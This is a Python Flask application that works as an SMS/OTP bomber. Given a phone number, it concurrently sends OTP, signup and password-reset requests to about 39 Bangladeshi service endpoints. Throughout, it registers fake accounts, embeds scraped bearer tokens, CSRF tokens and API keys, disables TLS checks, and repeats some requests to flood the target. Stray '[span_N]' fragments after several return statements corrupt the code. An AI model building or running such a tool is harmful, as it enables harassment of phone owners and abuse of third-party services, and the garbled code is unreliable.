import asyncio
import json
import random
import string
import time
import uuid
from urllib.parse import quote
import aiohttp
from flask import Flask, jsonify, request

app = Flask(__name__)


def random_string(length: int = 8) -> str:
    return "".join(random.choices(string.ascii_lowercase + string.digits, k=length))


def random_name() -> str:
    first_names = ["John", "Riyaz", "Sarah", "Michael", "Emma"]
    last_names = ["Smith", "Ahmed", "Khan", "Doe", "Patel"]
    return f"{random.choice(first_names)} {random.choice(last_names)}"


async def safe_request(
    session: aiohttp.ClientSession, name: str, method: str, url: str, **kwargs
) -> dict:
    try:
        async with session.request(method, url, ssl=False, **kwargs) as response:
            text = await response.text()
            return {"api": name, "status": response.status, "response": text}
    except Exception as e:
        return {"api": name, "status": "error", "error": str(e)}


# RedX
async def hit_api1(session: aiohttp.ClientSession, phone: str) -> dict:
    url = "https://api.redx.com.bd:443/v1/user/signup"
    payload = {"name": phone, "service": "redx", "phoneNumber": phone}
    return await safe_request(
        session, "api1_redx", "POST", url, json=payload, headers={"Content-Type": "application/json"}
    )


# KhaasFood (2 Steps)
async def hit_api2(session: aiohttp.ClientSession, phone: str) -> dict:
    url = "https://www.khaasfood.com/wp-admin/admin-ajax.php"
    csrf = "9d9d08e6e5"
    headers = {
        "accept": "application/json, text/javascript, */*; q=0.01",
        "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
        "origin": "https://www.khaasfood.com",
        "referer": "https://www.khaasfood.com/",
        "x-requested-with": "XMLHttpRequest",
        "user-agent": "Mozilla/5.0",
    }
    data1 = {
        "mobileNo": phone,
        "countrycode": "+880",
        "csrf": csrf,
        "login": "1",
        "json": "1",
        "action": "digits_check_mob",
    }
    data2 = {
        "mobileNo": phone,
        "digits_reg_mail": phone,
        "dig_nounce": csrf,
        "action": "digits_check_mob",
        "login": "2",
        "countrycode": "+880",
        "digregcode": "+880",
        "digregcode2": "+880",
        "digits": "1",
        "dtype": "2",
        "json": "1",
        "csrf": csrf,
    }
    res1 = await safe_request(session, "api2_khaasfood_step1", "POST", url, data=data1, headers=headers)
    res2 = await safe_request(session, "api2_khaasfood_step2", "POST", url, data=data2, headers=headers)
    return {"api": "api2_khaasfood", "step1": res1, "step2": res2}


# Bioscope
async def hit_api3(session: aiohttp.ClientSession, phone: str) -> dict:
    url = "https://api-dynamic.bioscopelive.com/v2/auth/login?country=BD&platform=web&language=en"
    headers = {
        "accept": "application/json",
        "content-type": "application/json",
        "origin": "https://www.bioscopeplus.com",
        "referer": "https://www.bioscopeplus.com/",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    }
    return await safe_request(
        session, "api3_bioscope", "POST", url, json={"number": f"+88{phone}"}, headers=headers
    )


# Bikroy
async def hit_api4(session: aiohttp.ClientSession, phone: str) -> dict:
    url = f"https://bikroy.com/data/phone_number_login/verifications/phone_login?phone={quote(phone)}"
    headers = {
        "accept": "application/json, text/plain, */*",
        "application-name": "web",
        "referer": "https://bikroy.com/en?login-modal=true&redirect-url=/en",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    }
    return await safe_request(session, "api4_bikroy", "GET", url, headers=headers)


# Proiojon
async def hit_api5(session: aiohttp.ClientSession, phone: str) -> dict:
    url = "https://billing.proiojon.com/api/v1/auth/sign-up"
    payload = {
        "name": random_string(10),
        "phone": phone,
        "email": f"{random_string(12)}@gmail.com",
        "password": "password123",
        "ref_code": "",
    }
    headers = {
        "accept": "*/*",
        "authorization": "Bearer null",
        "content-type": "application/json; charset=UTF-8",
        "origin": "https://proiojon.com",
        "referer": "https://proiojon.com/",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    }
    return await safe_request(session, "api5_proiojon", "POST", url, json=payload, headers=headers)


# Medha
async def hit_api7(session: aiohttp.ClientSession, phone: str) -> dict:
    url = "https://developer.medha.info/api/send-otp"
    payload = {"phone": "880" + phone.lstrip("0"), "is_register": "1"}
    headers = {
        "User-Agent": "Dart/3.2 (dart:io)",
        "content-type": "application/json; charset=utf-8",
        "authorization": "Bearer",
    }
    return await safe_request(session, "api7_medha", "POST", url, json=payload, headers=headers)


# Robi
async def hit_api9(session: aiohttp.ClientSession, phone: str) -> dict:
    url = "https://webapi.robi.com.bd/v1/send-otp"
    payload = {"phone_number": phone, "type": "doorstep"}
    headers = {
        "Authorization": "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJqdGkiOiJnaGd4eGM5NzZoaiIsImlhdCI6MTY5MjY0MjcyOCwibmJmIjoxNjkyNjQyNzI4LCJleHAiOjE2OTI2NDYzMjgsInVpZCI6IjU3OGpmZkBoZ2hoaiIsInN1YiI6IlJvYmlXZWJTaXRlVjIifQ.5xbPa1JiodXeIST6v9c0f_4thF6tTBzaLLfuHlN7NSc",
        "Content-Type": "application/json",
    }
    return await safe_request(session, "api9_robi", "POST", url, json=payload, headers=headers)


# Arogga (Web)
async def hit_api10(session: aiohttp.ClientSession, phone: str) -> dict:
    url = "https://api.arogga.com/auth/v1/sms/send/?f=web&b=Chrome&v=122.0.0.0&os=Windows&osv=10"
    form = aiohttp.FormData()
    form.add_field("mobile", phone)
    form.add_field("fcmToken", "")
    form.add_field("referral", "")
    headers = {
        "accept": "*/*",
        "origin": "https://www.arogga.com",
        "referer": "https://www.arogga.com/",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    }
    return await safe_request(session, "api10_arogga_web", "POST", url, data=form, headers=headers)


# Cinematic (MyGP)
async def hit_api11(session: aiohttp.ClientSession, phone: str) -> dict:
    url = f"https://api.mygp.cinematic.mobi/api/v1/send-common-otp/wap/{quote(phone)}"
    payload = {
        "headers": {
            "Content-Type": "application/json",
            "Access-Control-Allow-Origin": "*",
            "Authorization": "Bearer 1pake4mh5ln64h5t26kpvm3iri",
        }
    }
    headers = {
        "Accept": "application/json, text/plain, */*",
        "Content-Type": "application/json;charset=UTF-8",
        "Origin": "https://cinematic.mobi",
        "Referer": "https://cinematic.mobi/",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    }
    return await safe_request(session, "api11_cinematic", "POST", url, json=payload, headers=headers)


# BDStall
async def hit_api12(session: aiohttp.ClientSession, phone: str) -> dict:
    url = "https://www.bdstall.com/userRegistration/save_otp_info/"
    fields = {"UserTypeID": "2", "RequestType": "1", "Name": "Md", "Mobile": phone}
    return await safe_request(session, "api12_bdstall", "POST", url, data=fields)


# Sheba AccountKit
async def hit_api15(session: aiohttp.ClientSession, phone: str) -> dict:
    app_id = "8329815A6D1AE6DD"
    token_res = await safe_request(
        session, "api15_sheba_token", "GET", f"https://accounts.sheba.xyz/api/v1/accountkit/generate/token?app_id={app_id}"
    )
    api_token = ""
    try:
        api_token = json.loads(token_res.get("response", "{}")).get("token", "")
    except Exception:
        pass

    otp_res = await safe_request(
        session,
        "api15_sheba_otp",
        "POST",
        "https://accountkit.sheba.xyz/api/shoot-otp",
        json={"mobile": f"+88{phone}", "app_id": app_id, "api_token": api_token},
        headers={"Content-Type": "application/json"},
    )
    return {"api": "api15_sheba", "token_step": token_res, "otp_step": otp_res}


# Circle Reseller
async def hit_api20(session: aiohttp.ClientSession, phone: str) -> dict:
    url = "https://reseller.circle.com.bd/api/v2/auth/signup"
    payload = {
        "name": f"+88{phone}",
        "email_or_phone": f"+88{phone}",
        "password": "123456",
        "password_confirmation": "123456",
        "register_by": "phone",
    }
    headers = {
        "User-Agent": "Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0)",
        "Content-Type": "application/json",
    }
    return await safe_request(session, "api20_circle", "POST", url, json=payload, headers=headers)


# Chorcha
async def hit_api26(session: aiohttp.ClientSession, phone: str) -> dict:
    url = f"https://mujib.chorcha.net/auth/check?phone={quote(phone)}"
    headers = {"accept": "*/*", "x-chorcha-mode": "prod", "x-chorcha-platform": "web"}
    return await safe_request(session, "api26_chorcha", "GET", url, headers=headers)


# Chardike
async def hit_api29(session: aiohttp.ClientSession, phone: str) -> dict:
    url = "https://api.chardike.com/api/otp/send"
    headers = {
        "accept": "*/*",
        "content-type": "application/json",
        "origin": "https://chardike.com",
        "referer": "https://chardike.com/",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    }
    return await safe_request(
        session, "api29_chardike", "POST", url, json={"phone": phone, "otp_type": "login"}, headers=headers
    )


# Applink helper
async def _hit_applink(session: aiohttp.ClientSession, name: str, phone: str) -> dict:
    url = "https://apps.applink.com.bd/appstore-v4-server/login/otp/request"
    headers = {
        "Accept": "*/*",
        "Content-Type": "application/json",
        "Origin": "https://applink.com.bd",
        "Referer": "https://applink.com.bd/",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    }
    return await safe_request(session, name, "POST", url, json={"msisdn": f"88{phone}"}, headers=headers)


# Salextra helper
async def _hit_salextra(session: aiohttp.ClientSession, name: str, phone: str) -> dict:
    url = "https://salextra.com.bd/customer/checkusernameavailabilityonregistration"
    form_data = {
        "username": phone,
        "loginType": "MOBILE",
        "__RequestVerificationToken": "CfDJ8LiTcoRywYZJiSdmMqGF8TUqJw9C6KMdGm1h66OVTdHacNf0PM5Ejsmu_DNPddqz7Sk-XUyXwxIyHALKpZ5bn1jwr9l-9IzOmASY_Z3cKb2mndEZn3KyLqq80U8QyitKCPtmt1zxxiMWd_970_jfTmg",
    }
    headers = {
        "accept": "application/json, text/javascript, */*; q=0.01",
        "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
        "origin": "https://salextra.com.bd",
        "referer": "https://salextra.com.bd/register?returnUrl=%2F",
        "x-requested-with": "XMLHttpRequest",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    }
    return await safe_request(session, name, "POST", url, data=form_data, headers=headers)


# Osudpotro helper
async def _hit_osudpotro(session: aiohttp.ClientSession, name: str, phone: str) -> dict:
    url = "https://api.osudpotro.com/api/v1/users/send_otp"
    payload = {"mobile": f"+88-{phone}", "deviceToken": "app", "language": "bn", "os": "android"}
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0",
    }
    return await safe_request(session, name, "POST", url, json=payload, headers=headers)


# Grameenphone GPay CheckSignup
async def hit_api31(session: aiohttp.ClientSession, phone: str) -> dict:
    url = "https://gpayapp.grameenphone.com/prod_mfs/sub/user/checksignup"
    payload = {"deviceId": f"35{phone}30", "msisdn": phone, "tran_type": "OTPREQSIGNUP"}
    return await safe_request(
        session, "api31_gpay", "POST", url, json=payload, headers={"Content-Type": "application/json"}
    )[span_10](start_span)[span_10](end_span)


async def hit_api32(session: aiohttp.ClientSession, phone: str) -> dict:
    return await _hit_applink(session, "api32_applink", phone)[span_11](start_span)[span_11](end_span)


async def hit_api32_2(session: aiohttp.ClientSession, phone: str) -> dict:
    return await _hit_applink(session, "api32_2_applink", phone)[span_12](start_span)[span_12](end_span)


# Priyo Shikkhaloy
async def hit_api33(session: aiohttp.ClientSession, phone: str) -> dict:
    url = "https://app.priyoshikkhaloy.com/api/user/register-login.php"
    headers = {
        "User-Agent": "okhttp/4.11.0",
        "Accept-Encoding": "gzip",
        "Content-Type": "application/x-www-form-urlencoded",
    }
    return await safe_request(session, "api33_priyoshikkhaloy", "POST", url, data={"mobile": phone}, headers=headers)[span_13](start_span)[span_13](end_span)


async def hit_api35(session: aiohttp.ClientSession, phone: str) -> dict:
    return await _hit_salextra(session, "api35_salextra", phone)[span_14](start_span)[span_14](end_span)


async def hit_api35_2(session: aiohttp.ClientSession, phone: str) -> dict:
    return await _hit_salextra(session, "api35_2_salextra", phone)[span_15](start_span)[span_15](end_span)


# Sundora
async def hit_api36(session: aiohttp.ClientSession, phone: str) -> dict:
    url = "https://api.sundora.com.bd/api/user/customer/"
    formatted_phone = "+880" + phone[1:] if len(phone) > 1 and phone.startswith("0") else f"+88{phone}"
    payload = {
        "customer": {
            "email": f"kgjkgjgg{phone}@gmail.com",
            "password": "#bUV?'3*N#7N}.g",
            "password_confirmation": "#bUV?'3*N#7N}.g",
            "phone": formatted_phone,
            "draft_order_id": None,
            "first_name": "sdfgfd",
            "last_name": "fgfd",
            "note": {"birthday": "", "gender": "male"},
            "withTimeout": True,
            "newsletter_email": True,
            "newsletter_sms": True,
        }
    }
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 8.0; Win64; x64; rv:131.0) Gecko/20100101 Firefox/131.0",
        "Accept": "application/json, text/plain, */*",
        "Referer": "https://sundora.com.bd/",
        "My-Location": "BD",
        "Content-Type": "application/json",
        "Origin": "https://sundora.com.bd",
    }
    return await safe_request(session, "api36_sundora", "POST", url, json=payload, headers=headers)[span_16](start_span)[span_16](end_span)


# MyGP Cinematic OTP
async def hit_api37(session: aiohttp.ClientSession, phone: str) -> dict:
    url = f"https://api.mygp.cinematic.mobi/api/v1/otp/88{quote(phone)}/SBENT_3GB7D"
    payload = {
        "accessinfo": {
            "access_token": "K165S6V6q4C6G7H0y9C4f5W7t5YeC6",
            "referenceCode": "20190827042622",
        }
    }
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0",
        "Content-Type": "application/json",
    }
    return await safe_request(session, "api37_mygp_otp", "POST", url, json=payload, headers=headers)[span_17](start_span)[span_17](end_span)


# Meena Bazar
async def hit_api41(session: aiohttp.ClientSession, phone: str) -> dict:
    url = f"https://meenabazardev.com/api/mobile/front/send/otp?CellPhone={quote(phone)}&type=login"
    headers = {"User-Agent": "Dart/3.2 (dart:io)", "Accept-Encoding": "gzip", "content-type": "application/json"}
    return await safe_request(session, "api41_meenabazar", "POST", url, headers=headers)


# Iqra Live
async def hit_api43(session: aiohttp.ClientSession, phone: str) -> dict:
    return await safe_request(session, "api43_iqralive", "GET", f"http://apibeta.iqra-live.com/api/v1/sent-otp/{quote(phone)}")


# RedX (Alt payload)
async def hit_api46(session: aiohttp.ClientSession, phone: str) -> dict:
    url = "https://api.redx.com.bd/v1/user/signup"
    payload = {"name": phone, "phoneNumber": phone, "service": "redx"}
    return await safe_request(
        session, "api46_redx_alt", "POST", url, json=payload, headers={"Content-Type": "application/json"}
    )


# Ultimate Organic Life
async def hit_api49(session: aiohttp.ClientSession, phone: str) -> dict:
    reg_payload = {
        "customer_name": "hu",
        "customer_password": "12345678",
        "customer_password_confirmation": "12345678",
        "customer_email": f"{phone}hu@gmail.com",
        "customer_contact": phone,
        "customer_dob": "2000-01-02",
        "customer_gender": "male",
    }
    reg_res = await safe_request(
        session,
        "api49_register",
        "POST",
        "https://ultimateasiteapi.com/api/register-customer",
        json=reg_payload,
        headers={"Content-Type": "application/json"},
    )
    fp_res = await safe_request(
        session,
        "api49_forget_password",
        "POST",
        "https://ultimateasiteapi.com/api/forget-customer-password",
        json={"user_input": phone},
        headers={
            "accept": "application/json",
            "content-type": "application/json",
            "origin": "https://ultimateorganiclife.com",
            "referer": "https://ultimateorganiclife.com/",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        },
    )
    return {"api": "api49_ultimate", "register_step": reg_res, "forget_password_step": fp_res}


# KFC BD Register
async def hit_api52(session: aiohttp.ClientSession, phone: str) -> dict:
    url = "https://api.kfcbd.com/register"
    rand_str = "".join(random.choices(string.ascii_letters, k=8))
    payload = {
        "id": None,
        "name": "Sojib khane",
        "email": f"monirk2ib+{rand_str}@gmail.com",
        "mobile": phone,
        "address": None,
        "device_token": "dLvYmVLqT02A_ZAFsFa8gJ:APA91bHC8CtSoO-TaN-NFm4obg10-Blc1vji2lbq82KbIyEGsXobCa8hZs-XbWjyTYnLE7KgYDRWKdteBgU6zvixuYG-vV4aGCEvkItCk6DiXYKVvd_ecWxqraqX6vyYJMfWDWDeF1EG",
        "token": None,
        "dob": "",
        "otp": None,
    }
    headers = {"User-Agent": "Dart/3.1 (dart:io)", "Accept-Encoding": "gzip", "Content-Type": "application/json"}
    return await safe_request(session, "api52_kfcbd", "POST", url, json=payload, headers=headers)[span_18](start_span)[span_18](end_span)


# Grameenphone Offer Send OTP
async def hit_api53(session: aiohttp.ClientSession, phone: str) -> dict:
    url = "https://bkwebsitethc.grameenphone.com/api/v1/offer/send_otp"
    headers = {
        "Accept": "application/json, text/plain, */*",
        "Content-Type": "application/json",
        "Origin": "https://www.grameenphone.com",
        "Referer": "https://www.grameenphone.com/",
        "lang": "en",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    }
    return await safe_request(session, "api53_gp_offer", "POST", url, json={"msisdn": phone}, headers=headers)[span_19](start_span)[span_19](end_span)


# Eat-Z
async def hit_api55(session: aiohttp.ClientSession, phone: str) -> dict:
    url = "https://api.eat-z.com/auth/customer/app-connect"
    headers = {
        "User-Agent": "okhttp/4.12.0",
        "Accept": "application/json",
        "Accept-Encoding": "gzip",
        "x-eatz-apiclient": "ANDROID",
        "content-type": "application/json; charset=UTF-8",
    }
    return await safe_request(
        session, "api55_eatz", "POST", url, json={"username": "+880" + phone.lstrip("0")}, headers=headers
    )


async def hit_api56(session: aiohttp.ClientSession, phone: str) -> dict:
    return await _hit_osudpotro(session, "api56_osudpotro", phone)[span_20](start_span)[span_20](end_span)


async def hit_api56_2(session: aiohttp.ClientSession, phone: str) -> dict:
    return await _hit_osudpotro(session, "api56_2_osudpotro", phone)[span_21](start_span)[span_21](end_span)


# Kormi24 GraphQL
async def hit_api57(session: aiohttp.ClientSession, phone: str) -> dict:
    url = "https://api.kormi24.com/graphql"
    payload = {
        "operationName": "sendOTP",
        "variables": {
            "type": 1,
            "mobile": phone,
            "additional": json.dumps({"user_agent": "web", "mobile": phone}),
            "hash": "c3275518789fb74ac6cc30ce030afbf0bdff578579e2fb64571e63f5b2680180",
        },
        "query": (
            "mutation sendOTP($mobile: String!, $type: Int!, $additional: String, $hash: String!) { "
            "sendOTP(mobile: $mobile, type: $type, additional: $additional, hash: $hash) { "
            "status message __typename } }"
        ),
    }
    headers = {
        "accept": "*/*",
        "authorization": "tok",
        "content-type": "application/json",
        "origin": "https://www.kormi24.com",
        "referer": "https://www.kormi24.com/",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    }
    return await safe_request(session, "api57_kormi24", "POST", url, json=payload, headers=headers)


# Grameenphone WebLogin OTP (5 times concurrently)
async def hit_api58(session: aiohttp.ClientSession, phone: str) -> dict:
    url = "https://weblogin.grameenphone.com/backend/api/v1/otp"
    headers = {
        "Accept": "application/json, text/plain, */*",
        "Content-Type": "application/json",
        "Origin": "https://weblogin.grameenphone.com",
        "Referer": "https://weblogin.grameenphone.com/?referrer=https://www.grameenphone.com/flexi-plan/",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    }
    sub_tasks = [
        safe_request(session, f"api58_gp_weblogin_{i+1}", "POST", url, json={"msisdn": phone}, headers=headers)
        for i in range(5)
    ]
    return {"api": "api58_gp_weblogin_x5", "responses": await asyncio.gather(*sub_tasks)}[span_22](start_span)[span_22](end_span)


# Shwapno
async def hit_api59(session: aiohttp.ClientSession, phone: str) -> dict:
    url = "https://www.shwapno.com/api/auth"
    headers = {
        "accept": "*/*",
        "content-type": "application/json",
        "origin": "https://www.shwapno.com",
        "referer": "https://www.shwapno.com/",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    }
    return await safe_request(session, "api59_shwapno", "POST", url, json={"phoneNumber": f"+88{phone}"}, headers=headers)


# MyBL (Banglalink)
async def hit_api61(session: aiohttp.ClientSession, phone: str) -> dict:
    return await safe_request(
        session,
        "api61_mybl",
        "POST",
        "https://myblapi.banglalink.net/api/v1/send-otp",
        json={"phone": phone},
        headers={"Content-Type": "application/json"},
    )


# PBS
async def hit_api63(session: aiohttp.ClientSession, phone: str) -> dict:
    url = "https://apialpha.pbs.com.bd/api/OTP/generateOTP"
    headers = {
        "accept": "*/*",
        "content-type": "application/json",
        "origin": "https://pbs.com.bd",
        "referer": "https://pbs.com.bd/",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    }
    return await safe_request(
        session, "api63_pbs", "POST", url, json={"userPhone": phone, "otp": ""}, headers=headers
    )


# Arogga (App)
async def hit_api65(session: aiohttp.ClientSession, phone: str) -> dict:
    url = "https://api.arogga.com/auth/v1/sms/send?f=app&v=6.2.7&os=android&osv=33"
    form_data = {
        "mobile": phone,
        "fcmToken": "cQYjPWHHTDu1IVXnW90Xqs:APA91bHB71xe_ai41Vm-aq9DFkukrF9mAH13DPAIInmus7pykdI49PZTgqy4Qy5x8Q5TG6zd1HIOIGDCV8UH5K5l3rc1Z36R-km9T-NhotH3TBjhJOZ43Kw2xqr8lr3vuWgTMUHybMnR",
        "referral": "",
    }
    headers = {"User-Agent": "okhttp/4.9.2", "Accept-Encoding": "gzip", "Content-Type": "application/x-www-form-urlencoded"}
    return await safe_request(session, "api65_arogga_app", "POST", url, data=form_data, headers=headers)


# Fabrilife
async def hit_api71(session: aiohttp.ClientSession, phone: str) -> dict:
    signup_res = await safe_request(
        session,
        "api71_fabrilife_signup",
        "POST",
        "https://fabrilife.com/api/wp-json/wc/v2/user/register",
        json={"name": random_name(), "email": f"{phone}@gmail.com", "phone": phone, "password": "Riyaz@123"},
        headers={"User-Agent": "okhttp/3.12.12", "Accept-Encoding": "gzip", "Content-Type": "application/json"},
    )
    otp_res = await safe_request(
        session,
        "api71_fabrilife_otp",
        "POST",
        f"https://fabrilife.com/api/wp-json/wc/v2/user/phone-login/{quote(phone)}",
        headers={
            "User-Agent": "okhttp/3.12.12",
            "Accept-Encoding": "gzip",
            "otpkey": "uzmgAMHfQrukDqV1ecZ2xJGwqjiVPnE0byuqw2MW",
        },
    )
    return {"api": "api71_fabrilife", "signup_step": signup_res, "otp_step": otp_res}


# Kotha IM
async def hit_api72(session: aiohttp.ClientSession, phone: str) -> dict:
    device_id = str(uuid.uuid4())
    auth_res = await safe_request(
        session,
        "api72_kotha_auth",
        "POST",
        "https://user.kotha.im/mobile/api/deviceAuthWithRecipientStatus",
        json={"deviceId": device_id, "recipient": f"+88{phone}"},
        headers={"User-Agent": "okhttp/4.12.0", "Accept-Encoding": "gzip", "Content-Type": "application/json; charset=UTF-8"},
    )
    token = None
    try:
        token = json.loads(auth_res.get("response", "{}")).get("token")
    except Exception:
        pass

    if not token:
        return {
            "api": "api72_kotha",
            "auth_step": auth_res,
            "otp_step": {"status": "skipped", "reason": "Token not found in response"},
        }

    otp_res = await safe_request(
        session,
        "api72_kotha_otp",
        "POST",
        "https://user.kotha.im/mobile/api/sendOTPV2",
        json={"deviceId": device_id, "recipient": f"+88{phone}", "retryAttempt": 0},
        headers={
            "User-Agent": "kotha-android-version_0.1.20241002-code_285-os-sdk-level_33-manufacturer_OnePlus-model_GM1917-os-sdk-level_33",
            "Accept-Encoding": "gzip",
            "Authorization": token,
            "Content-Type": "application/json; charset=UTF-8",
        },
    )
    return {"api": "api72_kotha", "auth_step": auth_res, "otp_step": otp_res}


@app.route("/", methods=["GET"])
async def send_all_requests():
    phone = request.args.get("phone")
    if not phone:
        return jsonify({"status": "error", "message": "Please provide a phone parameter. Example: /?phone=01700000000"}), 400

    start_time = time.perf_counter()
    connector = aiohttp.TCPConnector(limit=75, ssl=False)
    timeout = aiohttp.ClientTimeout(total=8.5)

    async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
        handlers = [
            hit_api1, hit_api2, hit_api3, hit_api4, hit_api5, hit_api7, hit_api9, hit_api10,
            hit_api11, hit_api12, hit_api15, hit_api20, hit_api26, hit_api29, hit_api31, hit_api32,
            hit_api32_2, hit_api33, hit_api35, hit_api35_2, hit_api36, hit_api37, hit_api41, hit_api43,
            hit_api46, hit_api49, hit_api52, hit_api53, hit_api55, hit_api56, hit_api56_2, hit_api57,
            hit_api58, hit_api59, hit_api61, hit_api63, hit_api65, hit_api71, hit_api72,
        ]
        results = await asyncio.gather(*(fn(session, phone) for fn in handlers))

    return jsonify(
        {
            "phone": phone,
            "total_apis": len(results),
            "time_taken_seconds": round(time.perf_counter() - start_time, 3),
            "results": results,
        }
    )
